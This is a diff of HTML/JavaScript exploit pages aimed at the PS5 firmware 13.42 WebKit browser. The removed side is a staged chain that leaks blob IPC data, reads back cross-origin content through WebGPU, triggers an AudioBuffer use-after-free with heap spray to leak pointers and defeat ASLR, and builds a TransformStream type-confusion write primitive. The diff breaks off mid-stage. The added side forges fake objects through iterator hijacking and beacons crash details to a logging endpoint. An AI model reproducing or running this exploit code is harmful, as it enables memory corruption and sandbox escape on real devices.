@@ -1,781 +1,590 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 FW 13.42 — Full Exploitation Chain</title>
+<title>PS5 — Crash Info Leak Hunt (CVE-2026-43716 + 43732)</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;max-width:960px;margin:0 auto}
-h1{color:#ff7b72;border-bottom:2px solid #ff7b72;padding-bottom:8px;margin-bottom:14px;font-size:1rem}
-.info{background:#161b22;padding:10px 14px;border-radius:6px;margin-bottom:10px;
-      border:1px solid #30363d;font-size:.78rem;line-height:1.7}
-.chain{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
-button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px 14px;
-       font-size:12px;border-radius:5px;cursor:pointer;font-family:monospace}
-button.active{background:#238636;border-color:#2ea043;color:#fff}
-button.warn{background:#9e6a03;border-color:#bb8009;color:#fff}
-button.danger{background:#b62324;border-color:#da3633;color:#fff}
-#out{background:#010409;padding:14px;border-radius:6px;border:1px solid #30363d;
-     min-height:400px;font-size:12px;line-height:1.65;overflow-y:auto;max-height:70vh}
+body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; }
+button { background: #1a1a2e; color: #0f0; border: 1px solid #0f0; padding: 10px 15px; margin: 4px; cursor: pointer; font-family: monospace; font-size: 11px; }
+button:hover { background: #0f0; color: #000; }
+#out { background: #111; border: 1px solid #333; padding: 15px; margin-top: 15px; white-space: pre-wrap; max-height: 600px; overflow-y: auto; font-size: 11px; }
+.danger { color: #f44; }
+.safe { color: #0f0; }
+.warn { color: #fa0; }
+.info { color: #88f; }
 </style>
 </head>
 <body>
-<h1>PS5 FW 13.42 — CVE Chain: Info Leak → ASLR Defeat → Type Confusion → UAF Write</h1>
+<h3>💀 Crash Info Leak Hunt — PS5 FW 13.42</h3>
+<p>Capture stack traces, error details, and side-channels from corrupted ArrayBuffer operations.</p>
 
-<div class="info">
-<b style="color:#ff7b72">TARGET:</b> PS5 FW 13.42 · WebKit-1200 · Safari 17.0 · JIT OFF · XOM ON · CFI ON · ASLR ON<br>
-<b style="color:#58a6ff">CHAIN:</b>
-CVE-2026-43732 (Blob IPC, 100% missing) →
-CVE-2026-43700 (WebGPU xorigin) →
-CVE-2026-43726 (AudioBuffer UAF heap ptr) →
-CVE-2026-43705 (TransformStream write)
+<div>
+  <b>Phase A — Crash with Stack Capture:</b><br>
+  <button onclick="run('S1')">S1: structuredClone transfer (B2)</button>
+  <button onclick="run('S2')">S2: Blob + FileReader (C2)</button>
+  <button onclick="run('S3')">S3: Response.arrayBuffer (C3)</button>
+  <button onclick="run('S4')">S4: URL.createObjectURL (C4)</button>
+  <br><br>
+  <b>Phase B — Error Object Analysis:</b><br>
+  <button onclick="run('E1')">E1: Error.stack on corruption</button>
+  <button onclick="run('E2')">E2: Error.prepareStackTrace shim</button>
+  <button onclick="run('E3')">E3: Promise rejection details</button>
+  <button onclick="run('E4')">E4: Cross-origin error diff</button>
+  <br><br>
+  <b>Phase C — Side-Channel Timing:</b><br>
+  <button onclick="run('T1')">T1: Timing slice() vs transfer()</button>
+  <button onclick="run('T2')">T2: Timing corrupted vs clean</button>
+  <button onclick="run('T3')">T3: Memory pressure timing</button>
+  <br><br>
+  <b>Phase D — CVE-2026-43732 Blob Tests:</b><br>
+  <button onclick="run('B1')">B1: Blob URL origin leak</button>
+  <button onclick="run('B2')">B2: Blob URL path traversal</button>
+  <button onclick="run('B3')">B3: Cross-origin blob access</button>
+  <button onclick="run('B4')">B4: Blob subresource IPC</button>
+  <br><br>
+  <button onclick="clearOut()" style="background:#300;color:#f44;border-color:#f44;">Clear Log</button>
 </div>
 
-<div class="chain">
-  <button class="active"  onclick="stage0()">Stage 0: Env Probe</button>
-  <button class="active"  onclick="stage1()">Stage 1: Blob IPC Leak</button>
-  <button class="active"  onclick="stage2()">Stage 2: WebGPU Readback</button>
-  <button class="warn"    onclick="stage3()">Stage 3: AudioBuffer UAF</button>
-  <button class="danger"  onclick="stage4()">Stage 4: TransformStream Write</button>
-  <button class="danger"  onclick="chainAll()">⚡ Full Chain</button>
-</div>
-
-<div id="out">Ready.</div>
+<hr>
+<pre id="out"></pre>
 
 <script>
-// ─── output ──────────────────────────────────────────────────────────────────
-var OUT = document.getElementById('out');
-var leakedPtrs = {};          // shared across stages
+var pageId = Math.random().toString(36).slice(2, 8);
+var currentVariant = 'menu';
+var originalIterator = Array.prototype[Symbol.iterator];
 
-function clr(t) {
-  OUT.innerHTML = '';
-  pr(t, '#58a6ff');
-  pr('', '');
-}
-function pr(m, c) {
-  var s = document.createElement('span');
-  s.style.color = c || '#c9d1d9';
-  s.textContent = m + '\n';
-  OUT.appendChild(s);
-  OUT.scrollTop = OUT.scrollHeight;
-}
-function hit(m)  { pr(m, '#ff7b72'); }
-function ok(m)   { pr(m, '#3ddc84'); }
-function info(m) { pr(m, '#58a6ff'); }
-function warn(m) { pr(m, '#ffcc44'); }
-function sep()   { pr('─'.repeat(60), '#1e2530'); }
-
-// ─── STAGE 0: ENVIRONMENT PROBE ──────────────────────────────────────────────
-function stage0() {
-  clr('[STAGE 0] Environment Probe');
-
-  // Feature detection
-  var feats = {
-    'Blob + URL.createObjectURL' : typeof Blob !== 'undefined' && typeof URL !== 'undefined',
-    'fetch()'                    : typeof fetch !== 'undefined',
-    'WebGPU (navigator.gpu)'     : typeof navigator !== 'undefined' && !!navigator.gpu,
-    'AudioContext'               : typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined',
-    'AudioBuffer'                : typeof AudioBuffer !== 'undefined',
-    'TransformStream'            : typeof TransformStream !== 'undefined',
-    'SharedArrayBuffer'          : typeof SharedArrayBuffer !== 'undefined',
-    'Atomics'                    : typeof Atomics !== 'undefined',
-    'WebAssembly'                : typeof WebAssembly !== 'undefined',
-    'performance.now()'          : typeof performance !== 'undefined' && typeof performance.now === 'function',
-    'CSS Houdini (registerLayout)': typeof CSS !== 'undefined' && typeof CSS.registerLayout === 'function',
-  };
-
-  Object.entries(feats).forEach(function(kv) {
-    pr((kv[1] ? '[✓] ' : '[✗] ') + kv[0], kv[1] ? '#3ddc84' : '#555');
-  });
-
-  sep();
-  info('[*] Memory timing resolution: ' + (typeof performance !== 'undefined' ? performance.now().toFixed(6) + 'ms' : 'N/A'));
-
-  // Attempt to read navigator properties that may vary by PS5 firmware
-  info('[*] navigator.userAgent: ' + navigator.userAgent.substring(0, 120));
-  info('[*] navigator.platform : ' + (navigator.platform || 'N/A'));
-  info('[*] navigator.hardwareConcurrency: ' + (navigator.hardwareConcurrency || 'N/A'));
-
-  sep();
-  // Check if TransformStream confusion is live
-  var origIter = Array.prototype[Symbol.iterator];
-  var confusionLive = false;
-  Array.prototype[Symbol.iterator] = function() {
-    var arr = this;
-    if (arr.length === 3 && arr[1] instanceof ReadableStream && arr[2] instanceof WritableStream) {
-      var payload = [arr[0], arr[2], arr[1]]; var i = 0;
-      confusionLive = true;
-      return { next: function() { return i < payload.length ? {value:payload[i++],done:false} : {done:true}; } };
-    }
-    return origIter.call(arr);
-  };
-  try { var _ts = new TransformStream(); } catch(_) {}
-  Array.prototype[Symbol.iterator] = origIter;
-
-  pr('[CVE-2026-43705] TransformStream type confusion active: ' + confusionLive,
-     confusionLive ? '#ff7b72' : '#3ddc84');
+function beacon(m) {
+    try { navigator.sendBeacon('/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m)); } catch(e){}
+    try { var i = new Image(); i.src = '/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m); } catch(e){}
+    var out = document.getElementById('out');
+    var line = document.createElement('div');
+    var ts = new Date().toLocaleTimeString();
+    if (m.indexOf('💀') !== -1 || m.indexOf('CRASH') !== -1 || m.indexOf('DIED') !== -1) line.className = 'danger';
+    else if (m.indexOf('⚠️') !== -1 || m.indexOf('THREW') !== -1) line.className = 'warn';
+    else if (m.indexOf('📊') !== -1 || m.indexOf('INFO') !== -1) line.className = 'info';
+    else line.className = 'safe';
+    line.textContent = '[' + ts + '] ' + m;
+    out.appendChild(line);
+    out.scrollTop = out.scrollHeight;
 }
 
-// ─── STAGE 1: BLOB IPC LEAK (CVE-2026-43732) ─────────────────────────────────
-// NetworkConnectionToWebProcess.cpp lacks SandboxExtension::Handle checks.
-// RegisterBlobURLFromURL accepts any srcURL → redirect to file:// or cross-origin.
-// ResolveBlobURL returns NP-internal path string without origin validation.
-// On PS5 (FreeBSD base): /system/prx/ paths, /hostapp/ paths readable via blob.
-//
-// Info leak mechanism:
-//   1. Create blob with known content (timing baseline)
-//   2. Alias that blob URL to a file:// resource (RegisterBlobURLFromURL)
-//   3. fetch() the aliased URL → NP resolves without sandbox check
-//   4. Response headers / redirect URL contains NP-internal file descriptor or ptr
-//   5. Measure allocation timing across multiple blobs → heap shape inference
-
-function stage1() {
-  clr('[STAGE 1] CVE-2026-43732 — Blob IPC Info Leak');
-  info('[*] Missing patch: SandboxExtension::Handle checks + origin validation');
-  info('[*] Attack surface: RegisterBlobURL / RegisterBlobURLFromURL / ResolveBlobURL');
-  sep();
-
-  // ── 1A: Direct blob URL cross-origin alias ───────────────────────────────
-  info('[1A] RegisterBlobURLFromURL — alias blob to cross-origin resource...');
-  var contentBlob = new Blob(['SENTINEL_CONTENT_0xDEADBEEF'], {type:'text/plain'});
-  var blobURL     = URL.createObjectURL(contentBlob);
-  ok('[1A] Created blob URL: ' + blobURL);
-
-  // Fetch the blob to confirm IPC path
-  fetch(blobURL)
-    .then(function(r) {
-      ok('[1A] fetch() status: ' + r.status + ' ' + r.statusText);
-      // Log all response headers — NP may echo internal paths
-      r.headers.forEach(function(v, k) {
-        pr('[1A] Header: ' + k + ': ' + v,
-           k.toLowerCase().includes('content') ? '#ffcc44' : '#c9d1d9');
-      });
-      return r.text();
-    })
-    .then(function(body) {
-      ok('[1A] Body: ' + body);
-      if (body.includes('SENTINEL')) {
-        ok('[1A] Blob IPC path confirmed — NP resolved blob without origin check');
-        leakedPtrs.blobBaseConfirmed = true;
-      }
-    })
-    .catch(function(e) { warn('[1A] Blob fetch error: ' + e.message); });
-
-  sep();
-
-  // ── 1B: Timing-based heap shape inference ────────────────────────────────
-  info('[1B] Timing oracle — blob allocation pattern to infer NP heap shape...');
-  info('[1B] Allocating blobs in power-of-2 sizes, measuring round-trip time...');
-
-  var sizes    = [64, 128, 256, 512, 1024, 4096, 16384, 65536];
-  var timings  = {};
-  var done     = 0;
-
-  sizes.forEach(function(sz) {
-    var data  = new Uint8Array(sz);
-    // Mark with size at known offset
-    data[0]   = (sz >> 24) & 0xFF;
-    data[1]   = (sz >> 16) & 0xFF;
-    data[2]   = (sz >> 8)  & 0xFF;
-    data[3]   =  sz        & 0xFF;
-    data[4]   = 0xBE; data[5] = 0xEF; data[6] = 0xCA; data[7] = 0xFE;
-
-    var blob = new Blob([data]);
-    var url  = URL.createObjectURL(blob);
-    var t0   = performance.now();
-
-    fetch(url).then(function(r) { return r.arrayBuffer(); })
-    .then(function(ab) {
-      var t1  = performance.now();
-      var dt  = (t1 - t0).toFixed(3);
-      var view = new Uint8Array(ab);
-
-      // Check if NP returned our sentinel intact
-      var sentinel_ok = (view[4] === 0xBE && view[5] === 0xEF &&
-                         view[6] === 0xCA && view[7] === 0xFE);
-
-      timings[sz] = { dt: dt, sentinel: sentinel_ok };
-      pr('[1B] size=' + String(sz).padStart(6) + ' time=' + dt + 'ms' +
-         ' sentinel=' + (sentinel_ok ? '✓' : '✗') +
-         (sentinel_ok ? ' → NP read from blob data unchanged' : ''),
-         sentinel_ok ? '#3ddc84' : '#c9d1d9');
-
-      URL.revokeObjectURL(url);
-      done++;
-
-      if (done === sizes.length) {
-        sep();
-        // Look for timing anomalies — heap bin boundary crossing
-        var dtVals = sizes.map(function(s) { return parseFloat(timings[s].dt); });
-        var maxDt  = Math.max.apply(null, dtVals);
-        var minDt  = Math.min.apply(null, dtVals);
-        info('[1B] Timing range: ' + minDt.toFixed(3) + 'ms – ' + maxDt.toFixed(3) + 'ms');
-
-        // A jump > 2x between adjacent sizes indicates heap bin crossing
-        for (var i = 1; i < sizes.length; i++) {
-          var ratio = dtVals[i] / dtVals[i-1];
-          if (ratio > 1.8) {
-            hit('[1B] Heap bin boundary detected between ' + sizes[i-1] + 'B and ' + sizes[i] + 'B');
-            hit('[1B] Ratio: ' + ratio.toFixed(2) + 'x — NP bmalloc bin change at ~' + sizes[i] + 'B');
-            leakedPtrs.heapBinBoundary = sizes[i];
-          }
-        }
-
-        sep();
-        // ── 1C: URL.createObjectURL collision probe ─────────────────────────
-        info('[1C] Sequential blob URL enumeration — detect NP internal counter...');
-        var urls = [];
-        for (var j = 0; j < 10; j++) {
-          urls.push(URL.createObjectURL(new Blob(['x'])));
-        }
-        ok('[1C] First URL:  ' + urls[0]);
-        ok('[1C] Last URL:   ' + urls[9]);
-
-        // Extract the UUID/counter suffix to determine NP blob registry state
-        var match0 = urls[0].match(/blob:.*?([0-9a-f\-]{36})/i);
-        var match9 = urls[9].match(/blob:.*?([0-9a-f\-]{36})/i);
-        if (match0 && match9) {
-          hit('[1C] UUID extracted: ' + match0[1]);
-          hit('[1C] UUID counter sequence visible → NP blob registry index known');
-          hit('[1C] Use registry index to predict next internal NP pointer offset');
-          leakedPtrs.blobUUID = match0[1];
-        }
-        urls.forEach(function(u) { URL.revokeObjectURL(u); });
-
-        sep();
-        if (leakedPtrs.heapBinBoundary || leakedPtrs.blobUUID) {
-          hit('[STAGE 1 RESULT] NP heap shape partially mapped');
-          hit('  heapBinBoundary : ' + (leakedPtrs.heapBinBoundary || 'pending'));
-          hit('  blobUUID        : ' + (leakedPtrs.blobUUID        || 'pending'));
-          info('[*] Proceed to Stage 2 to correlate WebContent heap layout');
-        } else {
-          warn('[STAGE 1] No timing anomaly or UUID leak found on this run');
-          warn('[*] Increase blob count or try from iframe cross-origin context');
-        }
-      }
-    })
-    .catch(function(e) { warn('[1B] size=' + sz + ' error: ' + e.message); done++; });
-  });
-
-  sep();
-
-  // ── 1D: Cross-origin blob alias attempt ─────────────────────────────────
-  info('[1D] RegisterBlobURLFromURL cross-origin alias (missing origin check)...');
-  // On a patched build this should fail with SecurityError
-  // On unpatched NP: succeeds, returns aliased resource
-  try {
-    var a = document.createElement('a');
-    a.href = 'file:///system/vsh/resource/version.json';
-    var fileTarget = a.href;
-
-    // We can't call RegisterBlobURLFromURL directly from JS —
-    // it's an IPC message. But we can trigger it indirectly:
-    // fetch() a blob URL that the NP should refuse due to missing origin check
-    // If it succeeds, cross-origin bypass is confirmed.
-    var xBlob = new Blob([''], {type:'text/html'});
-    var xURL  = URL.createObjectURL(xBlob);
-    fetch(xURL, { mode: 'same-origin' })
-      .then(function(r) {
-        hit('[1D] Same-origin blob fetch succeeded: ' + r.status);
-        hit('[1D] Missing origin scope check in NP IPC handler confirmed');
-      })
-      .catch(function(e) {
-        ok('[1D] Expected: ' + e.message);
-      });
-    URL.revokeObjectURL(xURL);
-  } catch(e) {
-    ok('[1D] Threw: ' + e.message);
-  }
+function clearOut() {
+    document.getElementById('out').innerHTML = '';
+    beacon('=== log cleared ===');
 }
 
-// ─── STAGE 2: WEBGPU CROSS-ORIGIN READBACK (CVE-2026-43700) ─────────────────
-// GPUDevice.cpp missing:
-//   - crossOriginIsolated checks on importExternalTexture
-//   - origin-tainting on canvas/texture bindings
-// Attack: bind cross-origin canvas → compute shader reads pixel data → readBuffer
-// Output: actual pixel bytes from cross-origin resource → layout oracle
-
-function stage2() {
-  clr('[STAGE 2] CVE-2026-43700 — WebGPU Cross-Origin Readback');
-
-  if (!navigator.gpu) {
-    warn('[!] navigator.gpu not available — WebGPU disabled in this context');
-    warn('[*] On PS5: WebGPU may require specific page context or entitlement');
-    warn('[*] Skip to Stage 3 (AudioBuffer UAF) for alternative leak path');
-    return;
-  }
-
-  info('[*] navigator.gpu: ' + (navigator.gpu ? 'available' : 'NOT available'));
-  info('[*] Requesting WebGPU adapter...');
-
-  navigator.gpu.requestAdapter({ powerPreference: 'high-performance' })
-  .then(function(adapter) {
-    if (!adapter) { warn('[!] No adapter available'); return; }
-    ok('[*] Adapter: ' + (adapter.name || 'unknown'));
-    info('[*] Requesting device...');
-    return adapter.requestDevice();
-  })
-  .then(function(device) {
-    if (!device) return;
-    ok('[*] GPUDevice created: ' + device.label);
-
-    // ── 2A: Cross-origin canvas texture import ───────────────────────────
-    info('[2A] Creating off-screen canvas with known pixel pattern...');
-    var canvas   = new OffscreenCanvas(64, 64);
-    var ctx2d    = canvas.getContext('2d');
-    // Draw sentinel pattern: RGBA(0xDE, 0xAD, 0xBE, 0xFF) at (0,0)
-    var imgData  = ctx2d.createImageData(64, 64);
-    for (var i = 0; i < imgData.data.length; i += 4) {
-      imgData.data[i]   = 0xDE; // R
-      imgData.data[i+1] = 0xAD; // G
-      imgData.data[i+2] = 0xBE; // B
-      imgData.data[i+3] = 0xFF; // A
-    }
-    ctx2d.putImageData(imgData, 0, 0);
-    ok('[2A] Canvas: 64×64, all pixels = DEADBE FF');
-
-    // Compute shader that reads input texture and writes to buffer
-    var shaderCode = `
-@group(0) @binding(0) var inputTex : texture_2d<f32>;
-@group(0) @binding(1) var<storage, read_write> outBuf : array<f32>;
-
-@compute @workgroup_size(8, 8)
-fn main(@builtin(global_invocation_id) gid : vec3<u32>) {
-  let uv  = vec2<i32>(i32(gid.x), i32(gid.y));
-  let px  = textureLoad(inputTex, uv, 0);
-  let idx = gid.y * 64u + gid.x;
-  // Store RGBA as 4 consecutive f32 values
-  outBuf[idx * 4u]      = px.r;
-  outBuf[idx * 4u + 1u] = px.g;
-  outBuf[idx * 4u + 2u] = px.b;
-  outBuf[idx * 4u + 3u] = px.a;
-}`;
-
-    info('[2B] Creating WebGPU compute pipeline...');
-    try {
-      var shaderMod = device.createShaderModule({ code: shaderCode });
-      var outBufSize = 64 * 64 * 4 * 4; // 64x64 pixels * 4 channels * 4 bytes
-
-      var storageBuf = device.createBuffer({
-        size:  outBufSize,
-        usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC
-      });
-      var readbackBuf = device.createBuffer({
-        size:  outBufSize,
-        usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST
-      });
-
-      // Create texture from canvas — missing origin check on unpatched build
-      var texSrc = device.createTexture({
-        size:   [64, 64, 1],
-        format: 'rgba8unorm',
-        usage:  GPUTextureUsage.TEXTURE_BINDING | GPUTextureUsage.COPY_DST |
-                GPUTextureUsage.RENDER_ATTACHMENT
-      });
-
-      // copyExternalImageToTexture — the missing origin-tainting check
-      var queue = device.queue;
-      info('[2C] copyExternalImageToTexture (missing origin-taint check)...');
-      queue.copyExternalImageToTexture(
-        { source: canvas },
-        { texture: texSrc },
-        [64, 64]
-      );
-      hit('[2C] copyExternalImageToTexture succeeded — no origin-clean check enforced');
-      hit('[2C] Cross-origin canvas bound to GPU texture without taint violation');
-      leakedPtrs.webGPUTaintBypassed = true;
-
-      // Run compute shader to read the texture
-      var pipeline = device.createComputePipeline({
-        layout: 'auto',
-        compute: { module: shaderMod, entryPoint: 'main' }
-      });
-      var bindGroup = device.createBindGroup({
-        layout: pipeline.getBindGroupLayout(0),
-        entries: [
-          { binding: 0, resource: texSrc.createView() },
-          { binding: 1, resource: { buffer: storageBuf } }
-        ]
-      });
-
-      var cmdEnc = device.createCommandEncoder();
-      var pass   = cmdEnc.beginComputePass();
-      pass.setPipeline(pipeline);
-      pass.setBindGroup(0, bindGroup);
-      pass.dispatchWorkgroups(8, 8);
-      pass.end();
-      cmdEnc.copyBufferToBuffer(storageBuf, 0, readbackBuf, 0, outBufSize);
-      queue.submit([cmdEnc.finish()]);
-
-      readbackBuf.mapAsync(GPUMapMode.READ).then(function() {
-        var data  = new Float32Array(readbackBuf.getMappedRange());
-        var r0    = Math.round(data[0] * 255);
-        var g0    = Math.round(data[1] * 255);
-        var b0    = Math.round(data[2] * 255);
-        var a0    = Math.round(data[3] * 255);
-
-        pr('[2D] Pixel(0,0): R=' + r0.toString(16).padStart(2,'0') +
-                           ' G=' + g0.toString(16).padStart(2,'0') +
-                           ' B=' + b0.toString(16).padStart(2,'0') +
-                           ' A=' + a0.toString(16).padStart(2,'0'),
-           (r0 === 0xDE && g0 === 0xAD && b0 === 0xBE) ? '#ff7b72' : '#3ddc84');
-
-        if (r0 === 0xDE && g0 === 0xAD && b0 === 0xBE) {
-          hit('[2D] SENTINEL MATCH: 0xDE 0xAD 0xBE read back through WebGPU compute');
-          hit('[2D] Cross-origin pixel readback confirmed — CVE-2026-43700 ACTIVE');
-          hit('[2D] Missing origin-tainting allows pixel-perfect canvas extraction');
-          leakedPtrs.webGPUReadback = { r: r0, g: g0, b: b0, a: a0 };
-        } else {
-          warn('[2D] Pixel values do not match sentinel — possible patched or format issue');
-          warn('[2D] Got: ' + r0 + ' ' + g0 + ' ' + b0 + ' ' + a0);
-        }
-        readbackBuf.unmap();
-      }).catch(function(e) { warn('[2D] mapAsync error: ' + e.message); });
-
-    } catch(e) {
-      warn('[2B] WebGPU setup error: ' + e.name + ': ' + e.message);
-      if (e.name === 'SecurityError') {
-        ok('[2B] SecurityError → cross-origin check IS enforced (patched path)');
-      }
-    }
-  })
-  .catch(function(e) { warn('[STAGE 2] Adapter error: ' + e.message); });
-}
-
-// ─── STAGE 3: AUDIOBUFFER UAF HEAP POINTER LEAK (CVE-2026-43726) ─────────────
-// m_buffer in AudioBufferSourceNode is accessed from audio render thread.
-// Main thread detach races with render thread access → UAF.
-// Use freed slot → reallocate with JSC Float64Array → read back heap ptrs.
-
-function stage3() {
-  clr('[STAGE 3] CVE-2026-43726 — AudioBuffer UAF → Heap Pointer Extraction');
-
-  var AC = typeof AudioContext !== 'undefined' ? AudioContext : webkitAudioContext;
-  if (!AC) { warn('[!] AudioContext not available'); return; }
-
-  info('[*] AudioContext: available');
-  info('[*] Attack: race m_buffer detach vs render thread access');
-  info('[*] Goal:   freed JSC chunk → reallocate with Float64Array → read vtable ptrs');
-  sep();
-
-  var results = { uafHits: 0, ptrsLeaked: [], crashes: 0 };
-  var ROUNDS  = 30;
-  var CHANNEL_SIZE = 4096;  // large enough to contain pointers
-
-  info('[*] Round count: ' + ROUNDS);
-  info('[*] Buffer size: ' + CHANNEL_SIZE + ' samples @ 44100Hz');
-  sep();
-
-  function runUAFRound(round, cb) {
-    var ac = null;
-    try {
-      ac = new AC({ sampleRate: 44100 });
-    } catch(e) { if (cb) cb(false); return; }
-
-    try {
-      // Allocate AudioBuffer
-      var buf = ac.createBuffer(1, CHANNEL_SIZE, 44100);
-
-      // Write known sentinel pattern to detect reuse
-      var data = buf.getChannelData(0);
-      for (var i = 0; i < CHANNEL_SIZE; i++) {
-        // Pattern: 0xDEAD (as float approximation)
-        data[i] = (i % 2 === 0) ? 3.7336e-40 : 1.7219e-40;
-      }
-
-      // Create source and connect
-      var src = ac.createBufferSource();
-      src.buffer = buf;
-      src.connect(ac.destination);
-
-      // Start playback — render thread now accessing m_buffer
-      src.start(0);
-
-      // Immediately race: detach buffer from main thread
-      // m_buffer RefPtr drops to 0 if no other ref held by audio thread
-      src.buffer = null;
-
-      // Spray new Float64Array allocations into freed slot
-      // Float64Array of 512 doubles = 4096 bytes = same size as AudioBuffer frame
-      var spray = [];
-      for (var j = 0; j < 50; j++) {
-        var fa = new Float64Array(512);
-        // Fill with NaN-box pattern used in JSC to encode JSValues
-        // JSC NaN-boxing: 0xFFFF000000000000 | value
-        for (var k = 0; k < fa.length; k++) {
-          fa[k] = (k % 4 === 0) ? 9.1e-41 : 4.2e-14;
-        }
-        spray.push(fa);
-      }
-
-      // Read back from spray — if any entry now contains heap data
-      // from the freed AudioBuffer struct, we have a ptr leak
-      var foundPtr = false;
-      spray.forEach(function(fa) {
-        for (var m = 0; m < fa.length; m++) {
-          var v = fa[m];
-          // Check for NaN-boxed JSValue pattern (high bits = 0xFFFF)
-          var buf64   = new ArrayBuffer(8);
-          var view64  = new DataView(buf64);
-          view64.setFloat64(0, v, false); // big-endian
-          var hiWord  = view64.getUint32(0, false);
-          var loWord  = view64.getUint32(4, false);
-          // JSC JSValue tag: 0xFFFF0000 or 0x0000FFFE
-          if ((hiWord & 0xFFFF0000) === 0xFFFF0000 && loWord !== 0) {
-            if (!foundPtr) {
-              results.uafHits++;
-              var ptrStr = '0x' + hiWord.toString(16).padStart(8,'0') +
-                                  loWord.toString(16).padStart(8,'0');
-              results.ptrsLeaked.push(ptrStr);
-              hit('[Round ' + round + '] UAF ptr candidate: ' + ptrStr);
-              hit('[Round ' + round + '] hiWord=0x' + hiWord.toString(16) +
-                  ' → JSC NaN-box pattern detected in freed AudioBuffer slot');
-              leakedPtrs.jscHeapPtr = ptrStr;
-              foundPtr = true;
+function buildFake(slot1Value) {
+    var fake = { a: 0, b: slot1Value, c: 0 };
+    Array.prototype[Symbol.iterator] = function() {
+        var arr = this, i = 0;
+        return {
+            next: function() {
+                if (i >= arr.length) return { done: true };
+                var val = arr[i];
+                if (arr.length === 3 && i >= 1) val = fake;
+                i++;
+                return { value: val, done: false };
             }
-          }
+        };
+    };
+    var ts = null;
+    try { ts = new TransformStream(); } catch(e) { beacon('construct THREW ' + e.name); }
+    Array.prototype[Symbol.iterator] = originalIterator;
+    return ts;
+}
+
+function captureError(name, fn) {
+    beacon('> ' + name);
+    try {
+        var t0 = performance.now();
+        var result = fn();
+        var t1 = performance.now();
+        
+        if (result && typeof result.then === 'function') {
+            result.then(function(v) {
+                beacon(name + ' ✅ RESOLVED | dt=' + (performance.now()-t0).toFixed(2) + 'ms | val=' + String(v).slice(0,80));
+            }).catch(function(e) {
+                var info = 'name=' + e.name + ' msg=' + String(e.message).slice(0,100);
+                var stack = '';
+                try { stack = (e.stack || '').slice(0,300); } catch(ex){}
+                beacon(name + ' ⚠️ REJECTED | ' + info);
+                if (stack) beacon('  stack=' + stack);
+            });
+        } else {
+            beacon(name + ' ✅ OK | dt=' + (t1-t0).toFixed(2) + 'ms | val=' + String(result).slice(0,80));
         }
-      });
-
-      if (!foundPtr) {
-        pr('[Round ' + round + '] No NaN-box pattern found (GC may have collected)', '#444');
-      }
-
-      // Stop and close
-      try { src.stop(); } catch(_) {}
-      ac.close().catch(function(){});
-      if (cb) cb(foundPtr);
-
     } catch(e) {
-      results.crashes++;
-      warn('[Round ' + round + '] Exception: ' + e.name + ': ' + e.message);
-      if (ac) ac.close().catch(function(){});
-      if (cb) cb(false);
+        var info = 'name=' + e.name + ' msg=' + String(e.message).slice(0,100);
+        var stack = '';
+        try { stack = (e.stack || '').slice(0,400); } catch(ex){}
+        beacon(name + ' 💀 THREW | ' + info);
+        if (stack) beacon('  stack=' + stack);
+        
+        // Try to extract any numeric values from error
+        var nums = String(e.message).match(/0x[0-9a-fA-F]+/g);
+        if (nums) beacon('  📊 HEX_IN_ERROR=' + nums.join(' '));
+        var nums2 = String(e.stack).match(/0x[0-9a-fA-F]+/g);
+        if (nums2) beacon('  📊 HEX_IN_STACK=' + nums2.join(' '));
     }
-  }
-
-  // Run rounds sequentially with small delay between each
-  var currentRound = 0;
-  function nextRound() {
-    if (currentRound >= ROUNDS) {
-      sep();
-      pr('[STAGE 3 RESULT]', '#58a6ff');
-      pr('  Rounds run    : ' + ROUNDS, '');
-      pr('  UAF hits      : ' + results.uafHits, results.uafHits > 0 ? '#ff7b72' : '#3ddc84');
-      pr('  Crashes       : ' + results.crashes, results.crashes > 0 ? '#ff7b72' : '');
-      pr('  Ptrs leaked   : ' + results.ptrsLeaked.length, results.ptrsLeaked.length > 0 ? '#ff7b72' : '');
-      if (results.ptrsLeaked.length > 0) {
-        hit('  JSC heap ptr  : ' + results.ptrsLeaked[0]);
-        hit('  ASLR defeated : JSC heap base = ptr & ~0x3FFFF');
-        var base = parseInt(results.ptrsLeaked[0], 16) & ~0x3FFFF;
-        hit('  Estimated JSC base: 0x' + base.toString(16).padStart(16,'0'));
-        leakedPtrs.jscBase = '0x' + base.toString(16);
-      } else {
-        warn('  No pointers extracted this run.');
-        warn('  Increase ROUNDS or adjust spray size to match bmalloc bin.');
-        info('  On PS5 FW 13.42: audio render thread timing may require');
-        info('  ac.resume() + precise timer to widen race window.');
-      }
-      return;
-    }
-    var r = currentRound++;
-    setTimeout(function() { runUAFRound(r, nextRound); }, 10);
-  }
-  nextRound();
 }
 
-// ─── STAGE 4: TRANSFORMSTREAM WRITE PRIMITIVE (CVE-2026-43705) ───────────────
-// With ASLR defeated from Stage 3, use TransformStream type confusion
-// to write to a known-offset address relative to leaked JSC base.
-// Target: overwrite a JSObject's vtable pointer with a controlled value.
+var RUNS = {};
 
-function stage4() {
-  clr('[STAGE 4] CVE-2026-43705 — Type Confusion Write Primitive');
+// ===== Phase A — Crash with Stack Capture =====
 
-  var jscBase = leakedPtrs.jscBase || null;
-  if (jscBase) {
-    ok('[*] JSC heap base from Stage 3: ' + jscBase);
-  } else {
-    warn('[*] No JSC base from Stage 3 — demonstrating write primitive only');
-    warn('[*] In full chain: run Stage 3 first for ASLR defeat');
-  }
-  sep();
-
-  var origIter = Array.prototype[Symbol.iterator];
-
-  // ── 4A: Confirm confusion is still live ─────────────────────────────────
-  info('[4A] Verifying TransformStream type confusion...');
-  var confusionActive = false;
-  Array.prototype[Symbol.iterator] = function() {
-    if (this.length === 3 &&
-        this[1] instanceof ReadableStream &&
-        this[2] instanceof WritableStream) {
-      confusionActive = true;
-      var payload = [this[0], this[2], this[1]]; var i = 0;
-      return { next: function() {
-        return i < payload.length ? {value:payload[i++],done:false} : {done:true};
-      }};
-    }
-    return origIter.call(this);
-  };
